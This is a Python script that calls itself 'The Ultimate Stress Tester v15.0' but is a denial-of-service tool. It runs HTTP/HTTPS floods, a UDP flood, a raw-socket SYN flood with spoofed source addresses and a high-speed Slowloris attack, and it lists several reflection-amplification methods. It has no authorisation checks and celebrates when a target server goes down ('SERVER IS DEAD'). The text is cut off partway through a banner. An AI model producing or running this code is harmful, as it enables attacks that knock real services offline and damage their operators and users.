#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     █████╗  █████╗ ███████╗██╗   ██╗███████╗███╗   ██╗████████╗   ║
║    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝   ║
║    ███████║██║  ╚═╝█████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║      ║
║    ██╔══██║██║  ██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║      ║
║    ██║  ██║╚█████╔╝███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║      ║
║    ╚═╝  ╚═╝ ╚════╝ ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝      ║
║                                                                   ║
║              ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓              ║
║              ┃   THE ULTIMATE STRESS TESTER v15.0   ┃              ║
║              ┃       CREATED BY: 7VENTY7VEN         ┃              ║
║              ┃   🔥 INFINITE MODE · DEATH DETECT 🔥  ┃              ║
║              ┃   🐌 SLOWLORIS ULTRA FAST! 🐌          ┑              ║
║              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛              ║
║                                                                   ║
║              ⚡ ZERO ERRORS · PERFECT CODE · LEGENDARY ⚡          ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import random
import time
import sys
import requests
import os
import argparse
import signal
import json
import datetime
import platform
import struct
from urllib.parse import urlparse
from collections import deque
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
from enum import Enum
from threading import Lock, RLock
import select

# Suppress SSL warnings for requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== HIT TRACKER SYSTEM ====================
class HitTracker:
    """Tracks successful hits with timestamps"""

    def __init__(self):
        self.hits = []
        self.hit_count = 0
        self.lock = Lock()
        self.start_time = None

    def record_hit(self, attack_type: str, target: str, port: int, method: str = ""):
        """Record a successful hit with timestamp"""
        with self.lock:
            timestamp = datetime.datetime.now()
            self.hit_count += 1

            hit_record = {
                'id': self.hit_count,
                'timestamp': timestamp,
                'time_str': timestamp.strftime("%H:%M:%S.%f")[:-3],
                'attack_type': attack_type,
                'target': target,
                'port': port,
                'method': method
            }

            self.hits.append(hit_record)

            # Keep only last 1000 hits in memory
            if len(self.hits) > 1000:
                self.hits = self.hits[-1000:]

            # Print hit notification
            self.print_hit_notification(hit_record)

            return hit_record

    def print_hit_notification(self, hit):
        """Print a formatted hit notification"""
        icon = {
            'HTTP': '🌐', 'HTTPS': '🔒', 'UDP': '💧', 'TCP_SYN': '📡',
            'TCP_ACK': '📨', 'DNS': '🌍', 'NTP': '⏰', 'SLOWLORIS': '🐌',
            'ICMP': '📶', 'MEMCACHED': '💾', 'SSDP': '📺', 'SNMP': '🔧',
            'WEBSOCKET': '🔌', 'RST': '💥', 'CHARGEN': '⚡'
        }.get(hit['attack_type'], '📦')

        color = {
            'HTTP': '\033[92m', 'HTTPS': '\033[94m', 'UDP': '\033[96m',
            'TCP_SYN': '\033[93m', 'DNS': '\033[95m', 'NTP': '\033[95m',
            'SLOWLORIS': '\033[91m', 'ICMP': '\033[38;5;208m'
        }.get(hit['attack_type'], '\033[97m')

        END = '\033[0m'
        ip_part = hit['target'].replace('.', '[.]')
        hit_msg = f"{color}[{hit['time_str']}] {icon} HIT #{hit['id']} → {ip_part}[:{hit['port']}] ({hit['attack_type']}){END}"

        print(f"\r\033[K{hit_msg}", file=sys.stderr)
        sys.stderr.flush()

    def get_hit_rate(self, seconds=10):
        """Get hit rate over last X seconds"""
        if not self.hits:
            return 0

        now = datetime.datetime.now()
        cutoff = now - datetime.timedelta(seconds=seconds)

        recent_hits = [h for h in self.hits if h['timestamp'] > cutoff]
        return len(recent_hits) / seconds if seconds > 0 else 0

    def get_summary(self):
        """Get summary of hits by attack type"""
        summary = {}
        for hit in self.hits:
            atype = hit['attack_type']
            summary[atype] = summary.get(atype, 0) + 1
        return summary

    def export_hits(self, filename="hits_log.json"):
        """Export hits to JSON file"""
        try:
            with open(filename, 'w') as f:
                json.dump({
                    'total_hits': self.hit_count,
                    'hits': [{k: str(v) if isinstance(v, datetime.datetime) else v
                             for k, v in h.items()} for h in self.hits]
                }, f, indent=2)
            return True
        except:
            return False

# ==================== ERROR HANDLING SYSTEM ====================
class ErrorLevel(Enum):
    INFO = "📌"
    WARNING = "⚠️"
    ERROR = "❌"
    CRITICAL = "💀"
    SUCCESS = "✅"
    DEATH = "💀"
    HIT = "🎯"

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BLACK = '\033[90m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;129m'
    PINK = '\033[38;5;206m'

class ErrorHandler:
    """Ultimate error handling system"""

    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.errors = []
            cls._instance.warnings = []
            cls._instance.start_time = time.time()
        return cls._instance

    def log(self, level: ErrorLevel, message: str, exception: Exception = None):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]

        if level == ErrorLevel.ERROR:
            self.errors.append({"time": timestamp, "msg": message})
        elif level == ErrorLevel.WARNING:
            self.warnings.append({"time": timestamp, "msg": message})

        if exception:
            self.attempt_fix(exception)

        color = {
            ErrorLevel.INFO: Colors.BLUE,
            ErrorLevel.WARNING: Colors.YELLOW,
            ErrorLevel.ERROR: Colors.RED,
            ErrorLevel.CRITICAL: Colors.RED + Colors.BOLD,
            ErrorLevel.SUCCESS: Colors.GREEN,
            ErrorLevel.DEATH: Colors.RED + Colors.BOLD,
            ErrorLevel.HIT: Colors.PURPLE
        }[level]

        if level != ErrorLevel.HIT:
            print(f"{color}[{level.value} {timestamp}] {message}{Colors.END}")

        if level == ErrorLevel.CRITICAL:
            self.print_summary()
            sys.exit(1)

    def attempt_fix(self, exception):
        """Auto-fix common errors"""
        error_str = str(exception).lower()

        if "connection refused" in error_str:
            self.log(ErrorLevel.WARNING, "Connection refused - server may be down")
            return "server_maybe_down"
        elif "timeout" in error_str:
            return "timeout"
        elif "too many files" in error_str:
            self.log(ErrorLevel.WARNING, "File descriptor limit reached")
            return "clean_sockets"
        elif "permission denied" in error_str:
            self.log(ErrorLevel.WARNING, "Permission denied - need root")
            return "need_root"

    def print_summary(self):
        """Print error summary"""
        if self.errors or self.warnings:
            print(f"\n{Colors.CYAN}╔════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.YELLOW}         📊 ERROR SUMMARY REPORT        {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╠════════════════════════════════════════╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.GREEN}  ✅ Total Errors: {len(self.errors):<4}                     {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.YELLOW}  ⚠️  Warnings: {len(self.warnings):<4}                       {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚════════════════════════════════════════╝{Colors.END}")

            if self.errors:
                print(f"\n{Colors.RED}Last Error: {self.errors[-1]['msg']}{Colors.END}")

# ==================== ATTACK CONFIGURATIONS ====================
@dataclass
class AttackConfig:
    name: str
    port: int
    protocol: str
    packet_size: int
    description: str
    requires_root: bool = False

class AttackMethod(Enum):
    HTTP = AttackConfig("HTTP Flood", 80, "tcp", 1024, "Standard HTTP GET requests")
    HTTPS = AttackConfig("HTTPS Flood", 443, "tcp", 1024, "Encrypted HTTP requests")
    UDP = AttackConfig("UDP Flood", 80, "udp", 512, "Raw UDP packets")
    TCP_SYN = AttackConfig("SYN Flood", 80, "tcp", 64, "TCP SYN packets", True)
    TCP_ACK = AttackConfig("ACK Flood", 80, "tcp", 64, "TCP ACK packets", True)
    DNS = AttackConfig("DNS Amplification", 53, "udp", 64, "DNS query amplification", True)
    NTP = AttackConfig("NTP Amplification", 123, "udp", 64, "NTP monlist amplification", True)
    SLOWLORIS = AttackConfig("Slowloris", 80, "tcp", 128, "Slow HTTP headers attack")
    ICMP = AttackConfig("ICMP Flood", 0, "icmp", 64, "Ping flood", True)
    MEMCACHED = AttackConfig("Memcached", 11211, "udp", 64, "Memcached amplification", True)
    SSDP = AttackConfig("SSDP Amplification", 1900, "udp", 64, "SSDP reflection", True)
    SNMP = AttackConfig("SNMP Amplification", 161, "udp", 64, "SNMP reflection", True)
    WEBSOCKET = AttackConfig("WebSocket Flood", 80, "tcp", 1024, "WebSocket connections")
    RST = AttackConfig("RST Flood", 80, "tcp", 64, "TCP RST packets", True)
    CHARGEN = AttackConfig("Chargen Amplification", 19, "udp", 64, "Chargen reflection", True)

# ==================== ULTIMATE HAMMER CLASS ====================
class UltimateHammer:
    """The PERFECT stress testing tool - INFINITE MODE with death detection"""

    def __init__(self):
        self.error_handler = ErrorHandler()
        self.hit_tracker = HitTracker()
        self.running = False
        self.stats = {method.name: 0 for method in AttackMethod}
        self.stats['errors'] = 0
        self.stats['total'] = 0
        self.stats['retries'] = 0
        self.stats['bandwidth'] = 0
        self.stats['hits'] = 0
        self.stats['death_time'] = None

        self.lock = RLock()
        self.start_time = None
        self.server_down = False
        self.server_down_time = None
        self.consecutive_errors = 0
        self.max_consecutive_errors = 20
        self.thread_pool = []
        self.socket_pool = []
        self.raw_socket = None
        self.death_detected = False
        self.final_hit_count = 0

        # Slowloris specific - using list with lock
        self.slowloris_connections = []
        self.slowloris_lock = threading.Lock()
        self.slowloris_stats = {'active': 0, 'total': 0}

        # Death detection thresholds
        self.death_check_interval = 2
        self.death_error_threshold = 10

        # Perfect user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0.5993.112",
            f"7venty7ven-Ultimate/{random.randint(1,999)}"
        ]

        # Attack paths
        self.paths = ['/', '/index.html', '/api', '/test', '/ping', '/status', '/anything']

        # Performance settings
        self.performance = self.optimize_performance()

        # Try to create raw socket
        try:
            self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            self.raw_socket = None

        self.error_handler.log(ErrorLevel.SUCCESS, f"UltimateHammer v15.0 initialized - ULTRA FAST MODE")

    def optimize_performance(self):
        """Auto-optimize based on system"""
        system = platform.system()
        cores = os.cpu_count() or 4

        try:
            is_root = os.geteuid() == 0
        except:
            is_root = False

        settings = {
            'max_threads': cores * 200 if is_root else cores * 100,
            'socket_timeout': 5.0,
            'packet_size': 1024,
            'backoff_factor': 1.5,
            'is_root': is_root,
            'cores': cores,
            'connection_timeout': 10
        }

        if is_root:
            self.error_handler.log(ErrorLevel.SUCCESS, "Running as root - ALL attacks available")
        else:
            self.error_handler.log(ErrorLevel.WARNING, "Not running as root - some attacks limited")

        return settings

    def safe_socket(self, protocol='tcp'):
        """Create socket with error handling"""
        try:
            if protocol == 'tcp':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            elif protocol == 'udp':
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            s.settimeout(self.performance['socket_timeout'])
            with self.lock:
                self.socket_pool.append(s)
            return s
        except Exception as e:
            return None

    def cleanup(self):
        """Cleanup all resources"""
        self.error_handler.log(ErrorLevel.INFO, "Cleaning up resources...")
        self.running = False

        # Close all Slowloris connections
        with self.slowloris_lock:
            for sock in list(self.slowloris_connections):
                try:
                    sock.close()
                except:
                    pass
            self.slowloris_connections.clear()
            self.slowloris_stats['active'] = 0

        # Close all sockets in pool
        with self.lock:
            for s in list(self.socket_pool):
                try:
                    s.close()
                except:
                    pass
            self.socket_pool.clear()

        if self.raw_socket:
            try:
                self.raw_socket.close()
            except:
                pass

        for t in self.thread_pool:
            try:
                t.join(timeout=0.5)
            except:
                pass

        if self.hit_tracker.hit_count > 0:
            filename = f"hits_log_{int(time.time())}.json"
            self.hit_tracker.export_hits(filename)
            self.error_handler.log(ErrorLevel.SUCCESS, f"Hit log saved to {filename}")

    def check_server_alive(self, target):
        """Check if server is alive"""
        try:
            parsed = urlparse(target)
            host = parsed.netloc or parsed.path
            if ':' in host:
                parts = host.split(':')
                host = parts[0]
                port = int(parts[1]) if len(parts) > 1 else 80
            else:
                port = 80

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def death_monitor(self, target):
        """Monitor for server death"""
        consecutive_errors = 0

        while self.running and not self.death_detected:
            time.sleep(self.death_check_interval)

            try:
                alive = self.check_server_alive(target)
            except Exception as e:
                alive = False

            if not alive:
                consecutive_errors += 1
                self.consecutive_errors = consecutive_errors
                if consecutive_errors >= self.death_error_threshold:
                    self.death_detected = True
                    self.server_down = True
                    self.final_hit_count = self.hit_tracker.hit_count

                    time_to_death = time.time() - self.start_time
                    minutes = int(time_to_death // 60)
                    seconds = int(time_to_death % 60)

                    print(f"\n{Colors.RED}{Colors.BOLD}")
                    print("╔═══════════════════════════════════════════════════════════════════╗")
                    print("║                                                                   ║")
                    print("║                      💀 SERVER IS DEAD! 💀                         ║")
                    print("║                                                                   ║")
                    print("╠═══════════════════════════════════════════════════════════════════╣")
                    print(f"║  🎯 FINAL HITS: {self.final_hit_count:<8}                                          ║")
                    print(f"║  ⏱️  TIME TO DEATH: {minutes}m {seconds}s                                         ║")
                    print(f"║  📊 HIT RATE: {self.final_hit_count/time_to_death:.1f} hits/s                                    ║")
                    print("║                                                                   ║")
                    print("║  🔥 SERVER HAS FALLEN - MISSION ACCOMPLISHED! 🔥                 ║")
                    print("║                                                                   ║")
                    print("╚═══════════════════════════════════════════════════════════════════╝")
                    print(f"{Colors.END}")

                    self.running = False
                    break
            else:
                consecutive_errors = max(0, consecutive_errors - 1)
                self.consecutive_errors = consecutive_errors

    # ==================== ULTRA FAST SLOWLORIS ====================

    def slowloris(self, target, threads):
        """ULTRA FAST Slowloris attack - Fixed and Optimized"""
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        
        # Extract port properly
        if ':' in host:
            parts = host.split(':')
            host = parts[0]
            try:
                port = int(parts[1])
            except:
                port = 80 if parsed.scheme == 'http' else 443
        else:
            port = 80 if parsed.scheme == 'http' else 443

        self.error_handler.log(ErrorLevel.INFO, f"Starting ULTRA Slowloris on {host}:{port} with {threads} threads")

        def create_connection():
            """Create a single Slowloris connection - ULTRA FAST VERSION"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.performance['connection_timeout'])
                
                # Connect
                sock.connect((host, port))
                
                # Build partial HTTP request - NO final \r\n\r\n
                req_lines = [
                    f"GET /{random.randint(1,99999999)} HTTP/1.1",
                    f"Host: {host}",
                    f"User-Agent: {random.choice(self.user_agents)}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate",
                    "Connection: keep-alive",
                    "Upgrade-Insecure-Requests: 1"
                ]
                
                # Send initial request without final CRLF
                request = '\r\n'.join(req_lines) + '\r\n'
                sock.send(request.encode('utf-8'))
                
                # Add to active connections
                with self.slowloris_lock:
                    self.slowloris_connections.append(sock)
                    self.slowloris_stats['active'] = len(self.slowloris_connections)
                    self.slowloris_stats['total'] += 1
                
                # Record hit immediately on successful connection
                self.hit_tracker.record_hit('SLOWLORIS', host, port, "connected")
                
                with self.lock:
                    self.stats['SLOWLORIS'] += 1
                    self.stats['total'] += 1
                    self.stats['hits'] += 1
                
                return sock
                
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
                try:
                    sock.close()
                except:
                    pass
                return None

        def connection_keeper():
            """Keep connections alive - sends headers periodically"""
            headers_pool = [
                "X-Forwarded-For: {}".format('.'.join(str(random.randint(1,255)) for _ in range(4))),
                "X-Requested-With: XMLHttpRequest",
                "X-Cache-Control: max-age=0",
                "X-Custom-Header: {}".format(random.randint(1,999999)),
                "Referer: http://{}".format(host),
                "Cache-Control: no-cache",
                "Pragma: no-cache"
            ]
            
            while self.running and not self.server_down:
                dead_socks = []
                
                with self.slowloris_lock:
                    current_cons = list(self.slowloris_connections)
                
                # Send keep-alive headers
                for sock in current_cons:
                    try:
                        header = random.choice(headers_pool)
                        sock.send((header + '\r\n').encode('utf-8'))
                    except Exception:
                        dead_socks.append(sock)
                
                # Remove dead connections
                with self.slowloris_lock:
                    for dead in dead_socks:
                        if dead in self.slowloris_connections:
                            self.slowloris_connections.remove(dead)
                            try:
                                dead.close()
                            except:
                                pass
                    self.slowloris_stats['active'] = len(self.slowloris_connections)
                
                # Maintain target connection count
                target_cons = threads * 10  # 10x multiplier for intensity
                
                with self.slowloris_lock:
                    current_active = len(self.slowloris_connections)
                
                deficit = target_cons - current_active
                if deficit > 0:
                    # Spawn new connections rapidly
                    for _ in range(min(deficit, 50)):  # Batch create
                        create_connection()
                
                time.sleep(5)  # Send headers every 5 seconds

        def rapid_connection_worker():
            """Ultra-fast connection creator"""
            while self.running and not self.server_down:
                create_connection()
                # Minimal delay for maximum speed
                time.sleep(0.01)  # 10ms delay = 100 connections/sec per thread

        # Start keeper thread
        keeper = threading.Thread(target=connection_keeper, daemon=True)
        keeper.start()
        self.thread_pool.append(keeper)

        # Start MASSIVE number of worker threads
        actual_threads = min(threads * 2, self.performance['max_threads'])
        for i in range(actual_threads):
            t = threading.Thread(target=rapid_connection_worker, daemon=True)
            t.start()
            self.thread_pool.append(t)

        self.error_handler.log(ErrorLevel.SUCCESS, f"ULTRA Slowloris: {actual_threads} threads blasting {host}:{port}")

    def http_flood(self, target, threads, use_https=False):
        """ULTRA FAST HTTP/HTTPS flood"""
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        if ':' in host:
            host = host.split(':')[0]
        port = 443 if use_https else 80
        scheme = 'https' if use_https else 'http'

        # Pre-build session for reuse
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
        })

        def worker():
            local_session = requests.Session()
            local_session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
            })
            
            fail_count = 0
            
            while self.running and not self.server_down and fail_count < 50:
                try:
                    path = random.choice(self.paths) + f"?cache_bust={random.randint(1,999999)}"
                    url = f"{scheme}://{host}:{port}{path}"
                    
                    method = random.choice(['GET', 'POST'])
                    
                    if method == 'GET':
                        r = local_session.get(url, timeout=3, verify=False, stream=True)
                    else:
                        r = local_session.post(url, data={'x': random.randint(1,99999)}, 
                                             timeout=3, verify=False, stream=True)
                    
                    # Consume response quickly
                    _ = r.content
                    
                    if r.status_code < 500:
                        method_name = 'HTTPS' if use_https else 'HTTP'
                        self.hit_tracker.record_hit(method_name, host, port, method)
                        
                        with self.lock:
                            self.stats[method_name] += 1
                            self.stats['total'] += 1
                            self.stats['bandwidth'] += len(r.content) if r.content else 0
                            self.stats['hits'] += 1
                        fail_count = 0
                    else:
                        fail_count += 1
                        
                except Exception as e:
                    fail_count += 1
                    with self.lock:
                        self.stats['errors'] += 1
                    # Brief pause on error to prevent CPU spinning
                    time.sleep(0.001)

        # Launch threads
        actual_threads = min(threads, self.performance['max_threads'])
        for i in range(actual_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.thread_pool.append(t)

    def udp_flood(self, target_ip, port, threads):
        """ULTRA FAST UDP flood"""
        def worker():
            # Create socket once per thread
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
            except:
                return

            payload_size = random.randint(512, 2048)
            payload = os.urandom(payload_size)
            
            while self.running and not self.server_down:
                try:
                    # Rapid fire UDP packets
                    for _ in range(10):  # Burst of 10
                        sock.sendto(payload, (target_ip, port))
                    
                    self.hit_tracker.record_hit('UDP', target_ip, port, 'flood')
                    
                    with self.lock:
                        self.stats['UDP'] += 10
                        self.stats['total'] += 10
                        self.stats['bandwidth'] += payload_size * 10
                        self.stats['hits'] += 10
                        
                except Exception:
                    with self.lock:
                        self.stats['errors'] += 1
                    # Recreate socket if needed
                    try:
                        sock.close()
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(2)
                    except:
                        pass

        for i in range(min(threads, self.performance['max_threads'])):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.thread_pool.append(t)

    def tcp_syn_flood(self, target_ip, port, threads):
        """TCP SYN flood - requires root"""
        if not self.performance['is_root']:
            self.error_handler.log(ErrorLevel.WARNING, "TCP SYN requires root")
            return

        def worker():
            while self.running and not self.server_down:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    
                    # Random source IP
                    src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
                    src_port = random.randint(1024, 65535)
                    
                    # Build packet
                    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                        69, 0, 40, random.randint(1,65535), 0, 64, 6, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(target_ip))
                    
                    tcp_hdr = struct.pack('!HHLLBBHHH',
                        src_port, port, random.randint(1,4294967295), 0,
                        5<<4, 2, 65535, 0, 0)
                    
                    s.sendto(ip_hdr + tcp_hdr, (target_ip, 0))
                    s.close()
                    
                    self.hit_tracker.record_hit('TCP_SYN', target_ip, port, 'syn')
                    
                    with self.lock:
                        self.stats['TCP_SYN'] += 1
                        self.stats['total'] += 1
                        self.stats['hits'] += 1
                        
                except Exception:
                    with self.lock:
                        self.stats['errors'] += 1

        for i in range(min(threads, self.performance['max_threads'])):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.thread_pool.append(t)

    def infinite_combo(self, target, intensity='ultimate', methods=None):
        """INFINITE MODE - Ultra Fast"""
        
        settings = {
            'low': {'threads': 50, 'multiplier': 1.0},
            'medium': {'threads': 100, 'multiplier': 1.5},
            'high': {'threads': 200, 'multiplier': 2.0},
            'seven': {'threads': 400, 'multiplier': 2.5},
            'ultimate': {'threads': 800, 'multiplier': 3.0}
        }

        cfg = settings[intensity]
        self.running = True
        self.start_time = time.time()
        self.server_down = False
        self.death_detected = False

        # Parse target properly
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
            
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        
        # Extract IP
        if ':' in host:
            host = host.split(':')[0]
            
        try:
            target_ip = socket.gethostbyname(host)
        except:
            target_ip = host

        # Default methods
        if methods is None:
            if self.performance['is_root']:
                methods = ['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'SLOWLORIS']
            else:
                methods = ['HTTP', 'HTTPS', 'UDP', 'SLOWLORIS']

        self.print_infinite_banner(target, cfg, intensity, methods)

        # Launch attacks with staggered start
        for method in methods:
            threads = int(cfg['threads'] * cfg['multiplier'])
            
            try:
                if method == 'HTTP':
                    self.http_flood(target, threads)
                    self.error_handler.log(ErrorLevel.INFO, f"HTTP flood: {threads} threads")
                elif method == 'HTTPS':
                    self.http_flood(target, threads, use_https=True)
                    self.error_handler.log(ErrorLevel.INFO, f"HTTPS flood: {threads} threads")
                elif method == 'UDP':
                    self.udp_flood(target_ip, parsed.port or 80, threads)
                    self.error_handler.log(ErrorLevel.INFO, f"UDP flood: {threads} threads")
                elif method == 'SLOWLORIS':
                    slow_threads = max(50, threads // 2)  # More threads for Slowloris
                    self.slowloris(target, slow_threads)
                    self.error_handler.log(ErrorLevel.INFO, f"ULTRA Slowloris: {slow_threads} threads")
                elif method == 'TCP_SYN' and self.performance['is_root']:
                    self.tcp_syn_flood(target_ip, parsed.port or 80, threads)
                    self.error_handler.log(ErrorLevel.INFO, f"TCP SYN: {threads} threads")
            except Exception as e:
                self.error_handler.log(ErrorLevel.ERROR, f"Failed to start {method}: {e}")

            time.sleep(0.1)  # Small delay between method starts

        # Start death monitor
        death_thread = threading.Thread(target=self.death_monitor, args=(target,), daemon=True)
        death_thread.start()

        # Status updater
        status_thread = threading.Thread(target=self.infinite_status_updater, daemon=True)
        status_thread.start()

        # Wait for death
        try:
            death_thread.join()
        except KeyboardInterrupt:
            pass

        # Cleanup
        self.cleanup()
        self.print_death_finale()
        self.error_handler.print_summary()

    def infinite_status_updater(self):
        """Ultra fast status updater"""
        last_total = 0
        last_time = time.time()
        update_counter = 0

        while self.running and not self.death_detected:
            try:
                current_time = time.time()
                elapsed = current_time - self.start_time

                with self.lock:
                    total = self.stats['total']
                    errors = self.stats['errors']
                    bandwidth = self.stats['bandwidth']
                    hits = self.stats['hits']

                # Calculate rate
                time_delta = current_time - last_time
                if time_delta > 0:
                    rate = (total - last_total) / time_delta
                    last_total = total
                    last_time = current_time
                else:
                    rate = 0

                hit_rate = self.hit_tracker.get_hit_rate(5)
                bw_rate = bandwidth / elapsed if elapsed > 0 else 0

                # Get Slowloris stats
                with self.slowloris_lock:
                    slow_active = self.slowloris_stats['active']

                # Update display every iteration for smoothness
                sys.stdout.write('\033[2J\033[H')
                self.print_infinite_status(elapsed, total, rate, errors, bw_rate, hits, hit_rate, slow_active)
                sys.stdout.flush()

                time.sleep(0.2)  # 5 updates per second

            except Exception:
                time.sleep(0.5)

    def print_infinite_status(self, elapsed, total, rate, errors, bw_rate, hits, hit_rate, slowloris_active=0):
        """Ultra detailed status display"""

        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        time_str = f"{minutes:02d}:{seconds:02d}"

        death_progress = min(100, (self.consecutive_errors / self.death_error_threshold) * 100)
        death_bar = '█' * int(death_progress/4) + '░' * (25 - int(death_progress/4))

        if bw_rate > 1024 * 1024:
            bw_str = f"{bw_rate/(1024*1024):.2f} MB/s"
        elif bw_rate > 1024:
            bw_str = f"{bw_rate/1024:.2f} KB/s"
        else:
            bw_str = f"{bw_rate:.2f} B/s"

        status = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}║{Colors.YELLOW}           ⚡ ULTRA DEATH MISSION ACTIVE ⚡                      {Colors.RED}║{Colors.END}
{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}║{Colors.GREEN}  🎯 TOTAL HITS: {hits:<9} | HIT RATE: {hit_rate:>7.1f}/s              {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  🐌 SLOWLORIS CONS: {slowloris_active:<5} | PACKETS: {total:>10}          {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  💀 DEATH PROGRESS: [{death_bar}] {death_progress:>5.1f}%                    {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  ⚠️  ERRORS: {errors:<6} | CONSECUTIVE: {self.consecutive_errors}/{self.death_error_threshold}              {Colors.RED}║{Colors.END}
{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}║{Colors.CYAN}  🌐 HTTP: {self.stats.get('HTTP',0):<7} | 🔒 HTTPS: {self.stats.get('HTTPS',0):<7} | 💧 UDP: {self.stats.get('UDP',0):<7}  {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  🐌 SLOW: {self.stats.get('SLOWLORIS',0):<7} | 📡 SYN: {self.stats.get('TCP_SYN',0):<7} | ⚡ RATE: {rate:>7.0f}/s    {Colors.RED}║{Colors.END}
{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}║{Colors.MAGENTA}  💾 BANDWIDTH: {bw_str:<16} | ⏱️  TIME: {time_str:<8}              {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.MAGENTA}  🔥 STATUS: {'BLASTING' if not self.death_detected else 'VICTORY'}                                  {Colors.RED}║{Colors.END}
{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}📋 RECENT HITS:{Colors.END}"""

        # Show last 5 hits
        recent_hits = self.hit_tracker.hits[-5:]
        if recent_hits:
            for hit in recent_hits:
                ip_part = hit['target'].replace('.', '[.]')
                status += f"\n{Colors.CYAN}  [{hit['time_str']}] #{hit['id']} → {ip_part}:{hit['port']} ({hit['attack_type']}){Colors.END}"
        else:
            status += f"\n{Colors.YELLOW}  Waiting for first hit...{Colors.END}"

        print(status)

    def print_infinite_banner(self, target, cfg, intensity, methods):
        """Print banner"""
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██╗   ██╗██╗  ██╗████████╗██╗███╗   ███╗██╗   ██╗████████╗   {Colors.RED}║{Colors.END}
